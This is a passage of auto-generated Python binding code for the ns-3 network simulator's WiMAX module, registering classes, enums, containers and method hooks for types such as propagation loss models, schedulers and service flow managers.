module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::AttributeValue', 'ns3::empty', 'ns3::DefaultDeleter<ns3::AttributeValue>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::CallbackImplBase', 'ns3::empty', 'ns3::DefaultDeleter<ns3::CallbackImplBase>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::EventImpl', 'ns3::empty', 'ns3::DefaultDeleter<ns3::EventImpl>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::NixVector', 'ns3::empty', 'ns3::DefaultDeleter<ns3::NixVector>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::OutputStreamWrapper', 'ns3::empty', 'ns3::DefaultDeleter<ns3::OutputStreamWrapper>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::Packet', 'ns3::empty', 'ns3::DefaultDeleter<ns3::Packet>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::TraceSourceAccessor', 'ns3::empty', 'ns3::DefaultDeleter<ns3::TraceSourceAccessor>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('SsServiceFlowManager', parent=root_module['ns3::ServiceFlowManager'])
module.add_enum('ConfirmationCode', ['CONFIRMATION_CODE_SUCCESS', 'CONFIRMATION_CODE_REJECT'], outer_class=root_module['ns3::SsServiceFlowManager'])
module.add_class('ThreeLogDistancePropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('Time', import_from_module='ns.core')
module.add_enum('Unit', ['S', 'MS', 'US', 'NS', 'PS', 'FS', 'LAST'], outer_class=root_module['ns3::Time'], import_from_module='ns.core')
root_module['ns3::Time'].implicitly_converts_to(root_module['ns3::int64x64_t'])
module.add_class('Tlv', parent=root_module['ns3::Header'])
module.add_enum('CommonTypes', ['HMAC_TUPLE', 'MAC_VERSION_ENCODING', 'CURRENT_TRANSMIT_POWER', 'DOWNLINK_SERVICE_FLOW', 'UPLINK_SERVICE_FLOW', 'VENDOR_ID_EMCODING', 'VENDOR_SPECIFIC_INFORMATION'], outer_class=root_module['ns3::Tlv'])
module.add_class('TraceSourceAccessor', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::TraceSourceAccessor, ns3::empty, ns3::DefaultDeleter<ns3::TraceSourceAccessor> >'])
module.add_class('Trailer', import_from_module='ns.network', parent=root_module['ns3::Chunk'])
module.add_class('TwoRayGroundPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('Ucd', parent=root_module['ns3::Header'])
module.add_class('UlJob', parent=root_module['ns3::Object'])
module.add_enum('JobPriority', ['LOW', 'INTERMEDIATE', 'HIGH'], outer_class=root_module['ns3::UlJob'])
module.add_class('UlMap', parent=root_module['ns3::Header'])
module.add_class('UplinkScheduler', parent=root_module['ns3::Object'])
module.add_class('UplinkSchedulerMBQoS', parent=root_module['ns3::UplinkScheduler'])
module.add_class('UplinkSchedulerRtps', parent=root_module['ns3::UplinkScheduler'])
module.add_class('UplinkSchedulerSimple', parent=root_module['ns3::UplinkScheduler'])
module.add_class('WimaxConnection', parent=root_module['ns3::Object'])
module.add_class('WimaxMacQueue', parent=root_module['ns3::Object'])
module.add_class('WimaxMacToMacHeader', parent=root_module['ns3::Header'])
module.add_class('WimaxPhy', parent=root_module['ns3::Object'])
module.add_enum('ModulationType', ['MODULATION_TYPE_BPSK_12', 'MODULATION_TYPE_QPSK_12', 'MODULATION_TYPE_QPSK_34', 'MODULATION_TYPE_QAM16_12', 'MODULATION_TYPE_QAM16_34', 'MODULATION_TYPE_QAM64_23', 'MODULATION_TYPE_QAM64_34'], outer_class=root_module['ns3::WimaxPhy'])
module.add_enum('PhyState', ['PHY_STATE_IDLE', 'PHY_STATE_SCANNING', 'PHY_STATE_TX', 'PHY_STATE_RX'], outer_class=root_module['ns3::WimaxPhy'])
module.add_enum('PhyType', ['SimpleWimaxPhy', 'simpleOfdmWimaxPhy'], outer_class=root_module['ns3::WimaxPhy'])
module.add_class('AttributeAccessor', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::AttributeAccessor, ns3::empty, ns3::DefaultDeleter<ns3::AttributeAccessor> >'])
module.add_class('AttributeChecker', allow_subclassing=False, automatic_type_narrowing=True, import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::AttributeChecker, ns3::empty, ns3::DefaultDeleter<ns3::AttributeChecker> >'])
module.add_class('AttributeValue', allow_subclassing=False, automatic_type_narrowing=True, import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::AttributeValue, ns3::empty, ns3::DefaultDeleter<ns3::AttributeValue> >'])
module.add_class('BSScheduler', parent=root_module['ns3::Object'])
module.add_class('BSSchedulerRtps', parent=root_module['ns3::BSScheduler'])
module.add_class('BSSchedulerSimple', parent=root_module['ns3::BSScheduler'])
module.add_class('BandwidthRequestHeader', parent=root_module['ns3::Header'])
module.add_enum('HeaderType', ['HEADER_TYPE_INCREMENTAL', 'HEADER_TYPE_AGGREGATE'], outer_class=root_module['ns3::BandwidthRequestHeader'])
module.add_class('BsServiceFlowManager', parent=root_module['ns3::ServiceFlowManager'])
module.add_enum('ConfirmationCode', ['CONFIRMATION_CODE_SUCCESS', 'CONFIRMATION_CODE_REJECT'], outer_class=root_module['ns3::BsServiceFlowManager'])
module.add_class('CallbackChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])
module.add_class('CallbackImplBase', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::CallbackImplBase, ns3::empty, ns3::DefaultDeleter<ns3::CallbackImplBase> >'])
module.add_class('CallbackValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])
module.add_class('Channel', import_from_module='ns.network', parent=root_module['ns3::Object'])
module.add_class('ConnectionManager', parent=root_module['ns3::Object'])
module.add_class('Dcd', parent=root_module['ns3::Header'])
module.add_class('DlMap', parent=root_module['ns3::Header'])
module.add_class('DsaAck', parent=root_module['ns3::Header'])
module.add_class('DsaReq', parent=root_module['ns3::Header'])
module.add_class('DsaRsp', parent=root_module['ns3::Header'])
module.add_class('EmptyAttributeValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])
module.add_class('EventImpl', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::EventImpl, ns3::empty, ns3::DefaultDeleter<ns3::EventImpl> >'])
module.add_class('FixedRssLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('FragmentationSubheader', parent=root_module['ns3::Header'])
module.add_class('FriisPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('GenericMacHeader', parent=root_module['ns3::Header'])
module.add_class('GrantManagementSubheader', parent=root_module['ns3::Header'])
module.add_class('IpcsClassifier', parent=root_module['ns3::Object'])
module.add_class('Ipv4AddressChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])
module.add_class('Ipv4AddressValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])
module.add_class('Ipv4MaskChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])
module.add_class('Ipv4MaskValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])
module.add_class('Ipv6AddressChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])
module.add_class('Ipv6AddressValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])
module.add_class('Ipv6PrefixChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])
module.add_class('Ipv6PrefixValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])
module.add_class('LogDistancePropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('Mac48AddressChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])
module.add_class('Mac48AddressValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])
module.add_class('MatrixPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('NakagamiPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('NetDevice', import_from_module='ns.network', parent=root_module['ns3::Object'])
module.add_enum('PacketType', ['PACKET_HOST', 'NS3_PACKET_HOST', 'PACKET_BROADCAST', 'NS3_PACKET_BROADCAST', 'PACKET_MULTICAST', 'NS3_PACKET_MULTICAST', 'PACKET_OTHERHOST', 'NS3_PACKET_OTHERHOST'], outer_class=root_module['ns3::NetDevice'], import_from_module='ns.network')
module.add_class('NixVector', import_from_module='ns.network', parent=root_module['ns3::SimpleRefCount< ns3::NixVector, ns3::empty, ns3::DefaultDeleter<ns3::NixVector> >'])
module.add_class('Node', import_from_module='ns.network', parent=root_module['ns3::Object'])
module.add_class('ObjectFactoryChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])
module.add_class('ObjectFactoryValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])
module.add_class('OutputStreamWrapper', import_from_module='ns.network', parent=root_module['ns3::SimpleRefCount< ns3::OutputStreamWrapper, ns3::empty, ns3::DefaultDeleter<ns3::OutputStreamWrapper> >'])
module.add_class('Packet', import_from_module='ns.network', parent=root_module['ns3::SimpleRefCount< ns3::Packet, ns3::empty, ns3::DefaultDeleter<ns3::Packet> >'])
module.add_class('RandomVariableChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])
module.add_class('RandomVariableValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])
module.add_class('SimpleOfdmWimaxPhy', parent=root_module['ns3::WimaxPhy'])
module.add_enum('FrameDurationCode', ['FRAME_DURATION_2_POINT_5_MS', 'FRAME_DURATION_4_MS', 'FRAME_DURATION_5_MS', 'FRAME_DURATION_8_MS', 'FRAME_DURATION_10_MS', 'FRAME_DURATION_12_POINT_5_MS', 'FRAME_DURATION_20_MS'], outer_class=root_module['ns3::SimpleOfdmWimaxPhy'])
module.add_class('TimeChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])
module.add_class('TimeValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])
module.add_class('TypeIdChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])
module.add_class('TypeIdValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])
module.add_class('UintegerValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])
module.add_class('WimaxChannel', parent=root_module['ns3::Channel'])
module.add_class('WimaxNetDevice', parent=root_module['ns3::NetDevice'])
module.add_enum('Direction', ['DIRECTION_DOWNLINK', 'DIRECTION_UPLINK'], outer_class=root_module['ns3::WimaxNetDevice'])
module.add_enum('RangingStatus', ['RANGING_STATUS_EXPIRED', 'RANGING_STATUS_CONTINUE', 'RANGING_STATUS_ABORT', 'RANGING_STATUS_SUCCESS'], outer_class=root_module['ns3::WimaxNetDevice'])
module.add_class('AddressChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])
module.add_class('AddressValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])
module.add_class('BaseStationNetDevice', parent=root_module['ns3::WimaxNetDevice'])
module.add_enum('State', ['BS_STATE_DL_SUB_FRAME', 'BS_STATE_UL_SUB_FRAME', 'BS_STATE_TTG', 'BS_STATE_RTG'], outer_class=root_module['ns3::BaseStationNetDevice'])
module.add_enum('MacPreamble', ['SHORT_PREAMBLE', 'LONG_PREAMBLE'], outer_class=root_module['ns3::BaseStationNetDevice'])
module.add_class('SimpleOfdmWimaxChannel', parent=root_module['ns3::WimaxChannel'])
module.add_enum('PropModel', ['RANDOM_PROPAGATION', 'FRIIS_PROPAGATION', 'LOG_DISTANCE_PROPAGATION', 'COST231_PROPAGATION'], outer_class=root_module['ns3::SimpleOfdmWimaxChannel'])
module.add_class('SubscriberStationNetDevice', parent=root_module['ns3::WimaxNetDevice'])
module.add_enum('State', ['SS_STATE_IDLE', 'SS_STATE_SCANNING', 'SS_STATE_SYNCHRONIZING', 'SS_STATE_ACQUIRING_PARAMETERS', 'SS_STATE_WAITING_REG_RANG_INTRVL', 'SS_STATE_WAITING_INV_RANG_INTRVL', 'SS_STATE_WAITING_RNG_RSP', 'SS_STATE_ADJUSTING_PARAMETERS', 'SS_STATE_REGISTERED', 'SS_STATE_TRANSMITTING', 'SS_STATE_STOPPED'], outer_class=root_module['ns3::SubscriberStationNetDevice'])
module.add_enum('EventType', ['EVENT_NONE', 'EVENT_WAIT_FOR_RNG_RSP', 'EVENT_DL_MAP_SYNC_TIMEOUT', 'EVENT_LOST_DL_MAP', 'EVENT_LOST_UL_MAP', 'EVENT_DCD_WAIT_TIMEOUT', 'EVENT_UCD_WAIT_TIMEOUT', 'EVENT_RANG_OPP_WAIT_TIMEOUT'], outer_class=root_module['ns3::SubscriberStationNetDevice'])
module.add_container('std::vector< ns3::ServiceFlow * >', 'ns3::ServiceFlow *', container_type='vector')
module.add_container('std::vector< bool >', 'bool', container_type='vector')
module.add_container('ns3::bvec', 'bool', container_type='vector')
module.add_container('std::vector< ns3::DlFramePrefixIe >', 'ns3::DlFramePrefixIe', container_type='vector')
module.add_container('std::list< ns3::Ptr< ns3::Packet > >', 'ns3::Ptr< ns3::Packet >', container_type='list')
module.add_container('std::vector< ns3::SSRecord * >', 'ns3::SSRecord *', container_type='vector')
module.add_container('std::vector< ns3::OfdmUlBurstProfile >', 'ns3::OfdmUlBurstProfile', container_type='vector')
module.add_container('std::list< ns3::OfdmUlMapIe >', 'ns3::OfdmUlMapIe', container_type='list')
module.add_container('std::list< ns3::Ptr< ns3::UlJob > >', 'ns3::Ptr< ns3::UlJob >', container_type='list')
module.add_container('std::list< ns3::Ptr< ns3::Packet const > >', 'ns3::Ptr< ns3::Packet const >', container_type='list')
module.add_container('std::deque< ns3::WimaxMacQueue::QueueElement >', 'ns3::WimaxMacQueue::QueueElement', container_type='dequeue')
module.add_container('std::list< std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > > >', 'std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > >', container_type='list')
module.add_container('std::vector< ns3::Ptr< ns3::WimaxConnection > >', 'ns3::Ptr< ns3::WimaxConnection >', container_type='vector')
module.add_container('std::vector< ns3::OfdmDlBurstProfile >', 'ns3::OfdmDlBurstProfile', container_type='vector')
module.add_container('std::list< ns3::OfdmDlMapIe >', 'ns3::OfdmDlMapIe', container_type='list')
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) *', 'ns3::LogNodePrinter')
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) **', 'ns3::LogNodePrinter*')
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) *&', 'ns3::LogNodePrinter&')
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) *', 'ns3::LogTimePrinter')
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) **', 'ns3::LogTimePrinter*')
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) *&', 'ns3::LogTimePrinter&')
typehandlers.add_type_alias('std::vector< bool, std::allocator< bool > >', 'ns3::bvec')
typehandlers.add_type_alias('std::vector< bool, std::allocator< bool > >*', 'ns3::bvec*')
typehandlers.add_type_alias('std::vector< bool, std::allocator< bool > >&', 'ns3::bvec&')
nested_module = module.add_cpp_namespace('FatalImpl')
register_types_ns3_FatalImpl(nested_module)
nested_module = module.add_cpp_namespace('internal')
register_types_ns3_internal(nested_module)
def register_types_ns3_FatalImpl(module):
root_module = module.get_root()
def register_types_ns3_internal(module):
root_module = module.get_root()
def register_methods(root_module):
register_Ns3Address_methods(root_module, root_module['ns3::Address'])
register_Ns3AsciiTraceHelper_methods(root_module, root_module['ns3::AsciiTraceHelper'])
register_Ns3AsciiTraceHelperForDevice_methods(root_module, root_module['ns3::AsciiTraceHelperForDevice'])
register_Ns3AttributeConstructionList_methods(root_module, root_module['ns3::AttributeConstructionList'])
register_Ns3AttributeConstructionListItem_methods(root_module, root_module['ns3::AttributeConstructionList::Item'])
register_Ns3Buffer_methods(root_module, root_module['ns3::Buffer'])
register_Ns3BufferIterator_methods(root_module, root_module['ns3::Buffer::Iterator'])
register_Ns3ByteTagIterator_methods(root_module, root_module['ns3::ByteTagIterator'])
register_Ns3ByteTagIteratorItem_methods(root_module, root_module['ns3::ByteTagIterator::Item'])
register_Ns3ByteTagList_methods(root_module, root_module['ns3::ByteTagList'])
register_Ns3ByteTagListIterator_methods(root_module, root_module['ns3::ByteTagList::Iterator'])
register_Ns3ByteTagListIteratorItem_methods(root_module, root_module['ns3::ByteTagList::Iterator::Item'])
register_Ns3CallbackBase_methods(root_module, root_module['ns3::CallbackBase'])
register_Ns3Cid_methods(root_module, root_module['ns3::Cid'])
register_Ns3CidFactory_methods(root_module, root_module['ns3::CidFactory'])
register_Ns3CsParameters_methods(root_module, root_module['ns3::CsParameters'])
register_Ns3DcdChannelEncodings_methods(root_module, root_module['ns3::DcdChannelEncodings'])
register_Ns3DlFramePrefixIe_methods(root_module, root_module['ns3::DlFramePrefixIe'])
register_Ns3EventId_methods(root_module, root_module['ns3::EventId'])
register_Ns3IpcsClassifierRecord_methods(root_module, root_module['ns3::IpcsClassifierRecord'])
register_Ns3Ipv4Address_methods(root_module, root_module['ns3::Ipv4Address'])
register_Ns3Ipv4Mask_methods(root_module, root_module['ns3::Ipv4Mask'])
register_Ns3Ipv6Address_methods(root_module, root_module['ns3::Ipv6Address'])
register_Ns3Ipv6Prefix_methods(root_module, root_module['ns3::Ipv6Prefix'])
register_Ns3LogComponent_methods(root_module, root_module['ns3::LogComponent'])
register_Ns3Mac48Address_methods(root_module, root_module['ns3::Mac48Address'])
register_Ns3NetDeviceContainer_methods(root_module, root_module['ns3::NetDeviceContainer'])
register_Ns3NodeContainer_methods(root_module, root_module['ns3::NodeContainer'])
register_Ns3ObjectBase_methods(root_module, root_module['ns3::ObjectBase'])
register_Ns3ObjectDeleter_methods(root_module, root_module['ns3::ObjectDeleter'])
register_Ns3ObjectFactory_methods(root_module, root_module['ns3::ObjectFactory'])
register_Ns3OfdmDcdChannelEncodings_methods(root_module, root_module['ns3::OfdmDcdChannelEncodings'])
register_Ns3OfdmDlBurstProfile_methods(root_module, root_module['ns3::OfdmDlBurstProfile'])
register_Ns3OfdmDlMapIe_methods(root_module, root_module['ns3::OfdmDlMapIe'])
register_Ns3OfdmUlBurstProfile_methods(root_module, root_module['ns3::OfdmUlBurstProfile'])
register_Ns3OfdmUlMapIe_methods(root_module, root_module['ns3::OfdmUlMapIe'])
register_Ns3PacketMetadata_methods(root_module, root_module['ns3::PacketMetadata'])
register_Ns3PacketMetadataItem_methods(root_module, root_module['ns3::PacketMetadata::Item'])
register_Ns3PacketMetadataItemIterator_methods(root_module, root_module['ns3::PacketMetadata::ItemIterator'])
register_Ns3PacketTagIterator_methods(root_module, root_module['ns3::PacketTagIterator'])
register_Ns3PacketTagIteratorItem_methods(root_module, root_module['ns3::PacketTagIterator::Item'])
register_Ns3PacketTagList_methods(root_module, root_module['ns3::PacketTagList'])
register_Ns3PacketTagListTagData_methods(root_module, root_module['ns3::PacketTagList::TagData'])
register_Ns3PcapFile_methods(root_module, root_module['ns3::PcapFile'])
register_Ns3PcapHelper_methods(root_module, root_module['ns3::PcapHelper'])
register_Ns3PcapHelperForDevice_methods(root_module, root_module['ns3::PcapHelperForDevice'])
register_Ns3RandomVariable_methods(root_module, root_module['ns3::RandomVariable'])
register_Ns3SNRToBlockErrorRateManager_methods(root_module, root_module['ns3::SNRToBlockErrorRateManager'])
register_Ns3SNRToBlockErrorRateRecord_methods(root_module, root_module['ns3::SNRToBlockErrorRateRecord'])
register_Ns3SSRecord_methods(root_module, root_module['ns3::SSRecord'])
register_Ns3SeedManager_methods(root_module, root_module['ns3::SeedManager'])
register_Ns3SendParams_methods(root_module, root_module['ns3::SendParams'])
register_Ns3SequentialVariable_methods(root_module, root_module['ns3::SequentialVariable'])
register_Ns3ServiceFlow_methods(root_module, root_module['ns3::ServiceFlow'])
register_Ns3ServiceFlowRecord_methods(root_module, root_module['ns3::ServiceFlowRecord'])
register_Ns3SimpleRefCount__Ns3Object_Ns3ObjectBase_Ns3ObjectDeleter_methods(root_module, root_module['ns3::SimpleRefCount< ns3::Object, ns3::ObjectBase, ns3::ObjectDeleter >'])
register_Ns3Simulator_methods(root_module, root_module['ns3::Simulator'])
register_Ns3Tag_methods(root_module, root_module['ns3::Tag'])
register_Ns3TagBuffer_methods(root_module, root_module['ns3::TagBuffer'])
register_Ns3TlvValue_methods(root_module, root_module['ns3::TlvValue'])
register_Ns3TosTlvValue_methods(root_module, root_module['ns3::TosTlvValue'])
register_Ns3TriangularVariable_methods(root_module, root_module['ns3::TriangularVariable'])
register_Ns3TypeId_methods(root_module, root_module['ns3::TypeId'])
register_Ns3TypeIdAttributeInformation_methods(root_module, root_module['ns3::TypeId::AttributeInformation'])
register_Ns3TypeIdTraceSourceInformation_methods(root_module, root_module['ns3::TypeId::TraceSourceInformation'])
register_Ns3U16TlvValue_methods(root_module, root_module['ns3::U16TlvValue'])
register_Ns3U32TlvValue_methods(root_module, root_module['ns3::U32TlvValue'])
register_Ns3U8TlvValue_methods(root_module, root_module['ns3::U8TlvValue'])
register_Ns3UcdChannelEncodings_methods(root_module, root_module['ns3::UcdChannelEncodings'])
register_Ns3UniformVariable_methods(root_module, root_module['ns3::UniformVariable'])
register_Ns3VectorTlvValue_methods(root_module, root_module['ns3::VectorTlvValue'])
register_Ns3WeibullVariable_methods(root_module, root_module['ns3::WeibullVariable'])
register_Ns3WimaxHelper_methods(root_module, root_module['ns3::WimaxHelper'])
register_Ns3ZetaVariable_methods(root_module, root_module['ns3::ZetaVariable'])
register_Ns3ZipfVariable_methods(root_module, root_module['ns3::ZipfVariable'])
register_Ns3Empty_methods(root_module, root_module['ns3::empty'])
register_Ns3Int64x64_t_methods(root_module, root_module['ns3::int64x64_t'])
register_Ns3SimpleOfdmSendParam_methods(root_module, root_module['ns3::simpleOfdmSendParam'])
register_Ns3Chunk_methods(root_module, root_module['ns3::Chunk'])
register_Ns3ClassificationRuleVectorTlvValue_methods(root_module, root_module['ns3::ClassificationRuleVectorTlvValue'])
register_Ns3ConstantVariable_methods(root_module, root_module['ns3::ConstantVariable'])
register_Ns3CsParamVectorTlvValue_methods(root_module, root_module['ns3::CsParamVectorTlvValue'])
register_Ns3DeterministicVariable_methods(root_module, root_module['ns3::DeterministicVariable'])
register_Ns3EmpiricalVariable_methods(root_module, root_module['ns3::EmpiricalVariable'])
register_Ns3ErlangVariable_methods(root_module, root_module['ns3::ErlangVariable'])
register_Ns3ExponentialVariable_methods(root_module, root_module['ns3::ExponentialVariable'])
register_Ns3GammaVariable_methods(root_module, root_module['ns3::GammaVariable'])
register_Ns3Header_methods(root_module, root_module['ns3::Header'])
register_Ns3IntEmpiricalVariable_methods(root_module, root_module['ns3::IntEmpiricalVariable'])
register_Ns3Ipv4AddressTlvValue_methods(root_module, root_module['ns3::Ipv4AddressTlvValue'])
register_Ns3Ipv4AddressTlvValueIpv4Addr_methods(root_module, root_module['ns3::Ipv4AddressTlvValue::ipv4Addr'])
register_Ns3LogNormalVariable_methods(root_module, root_module['ns3::LogNormalVariable'])
register_Ns3MacHeaderType_methods(root_module, root_module['ns3::MacHeaderType'])
register_Ns3ManagementMessageType_methods(root_module, root_module['ns3::ManagementMessageType'])
register_Ns3NormalVariable_methods(root_module, root_module['ns3::NormalVariable'])
register_Ns3Object_methods(root_module, root_module['ns3::Object'])
register_Ns3ObjectAggregateIterator_methods(root_module, root_module['ns3::Object::AggregateIterator'])
register_Ns3OfdmDownlinkFramePrefix_methods(root_module, root_module['ns3::OfdmDownlinkFramePrefix'])
register_Ns3OfdmSendParams_methods(root_module, root_module['ns3::OfdmSendParams'])
register_Ns3OfdmUcdChannelEncodings_methods(root_module, root_module['ns3::OfdmUcdChannelEncodings'])
register_Ns3PacketBurst_methods(root_module, root_module['ns3::PacketBurst'])
register_Ns3ParetoVariable_methods(root_module, root_module['ns3::ParetoVariable'])
register_Ns3PcapFileWrapper_methods(root_module, root_module['ns3::PcapFileWrapper'])
register_Ns3PortRangeTlvValue_methods(root_module, root_module['ns3::PortRangeTlvValue'])
register_Ns3PortRangeTlvValuePortRange_methods(root_module, root_module['ns3::PortRangeTlvValue::PortRange'])
register_Ns3PriorityUlJob_methods(root_module, root_module['ns3::PriorityUlJob'])
register_Ns3PropagationLossModel_methods(root_module, root_module['ns3::PropagationLossModel'])
register_Ns3ProtocolTlvValue_methods(root_module, root_module['ns3::ProtocolTlvValue'])
register_Ns3RandomPropagationLossModel_methods(root_module, root_module['ns3::RandomPropagationLossModel'])
register_Ns3RangePropagationLossModel_methods(root_module, root_module['ns3::RangePropagationLossModel'])
register_Ns3RngReq_methods(root_module, root_module['ns3::RngReq'])
register_Ns3RngRsp_methods(root_module, root_module['ns3::RngRsp'])
register_Ns3SSManager_methods(root_module, root_module['ns3::SSManager'])
register_Ns3ServiceFlowManager_methods(root_module, root_module['ns3::ServiceFlowManager'])
register_Ns3SfVectorTlvValue_methods(root_module, root_module['ns3::SfVectorTlvValue'])
register_Ns3SimpleRefCount__Ns3AttributeAccessor_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeAccessor__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::AttributeAccessor, ns3::empty, ns3::DefaultDeleter<ns3::AttributeAccessor> >'])
register_Ns3SimpleRefCount__Ns3AttributeChecker_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeChecker__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::AttributeChecker, ns3::empty, ns3::DefaultDeleter<ns3::AttributeChecker> >'])
register_Ns3SimpleRefCount__Ns3AttributeValue_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeValue__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::AttributeValue, ns3::empty, ns3::DefaultDeleter<ns3::AttributeValue> >'])
register_Ns3SimpleRefCount__Ns3CallbackImplBase_Ns3Empty_Ns3DefaultDeleter__lt__ns3CallbackImplBase__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::CallbackImplBase, ns3::empty, ns3::DefaultDeleter<ns3::CallbackImplBase> >'])
register_Ns3SimpleRefCount__Ns3EventImpl_Ns3Empty_Ns3DefaultDeleter__lt__ns3EventImpl__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::EventImpl, ns3::empty, ns3::DefaultDeleter<ns3::EventImpl> >'])
register_Ns3SimpleRefCount__Ns3NixVector_Ns3Empty_Ns3DefaultDeleter__lt__ns3NixVector__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::NixVector, ns3::empty, ns3::DefaultDeleter<ns3::NixVector> >'])
register_Ns3SimpleRefCount__Ns3OutputStreamWrapper_Ns3Empty_Ns3DefaultDeleter__lt__ns3OutputStreamWrapper__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::OutputStreamWrapper, ns3::empty, ns3::DefaultDeleter<ns3::OutputStreamWrapper> >'])
register_Ns3SimpleRefCount__Ns3Packet_Ns3Empty_Ns3DefaultDeleter__lt__ns3Packet__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::Packet, ns3::empty, ns3::DefaultDeleter<ns3::Packet> >'])
register_Ns3SimpleRefCount__Ns3TraceSourceAccessor_Ns3Empty_Ns3DefaultDeleter__lt__ns3TraceSourceAccessor__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::TraceSourceAccessor, ns3::empty, ns3::DefaultDeleter<ns3::TraceSourceAccessor> >'])
register_Ns3SsServiceFlowManager_methods(root_module, root_module['ns3::SsServiceFlowManager'])
register_Ns3ThreeLogDistancePropagationLossModel_methods(root_module, root_module['ns3::ThreeLogDistancePropagationLossModel'])
register_Ns3Time_methods(root_module, root_module['ns3::Time'])
register_Ns3Tlv_methods(root_module, root_module['ns3::Tlv'])
register_Ns3TraceSourceAccessor_methods(root_module, root_module['ns3::TraceSourceAccessor'])
register_Ns3Trailer_methods(root_module, root_module['ns3::Trailer'])
register_Ns3TwoRayGroundPropagationLossModel_methods(root_module, root_module['ns3::TwoRayGroundPropagationLossModel'])
register_Ns3Ucd_methods(root_module, root_module['ns3::Ucd'])
register_Ns3UlJob_methods(root_module, root_module['ns3::UlJob'])
register_Ns3UlMap_methods(root_module, root_module['ns3::UlMap'])
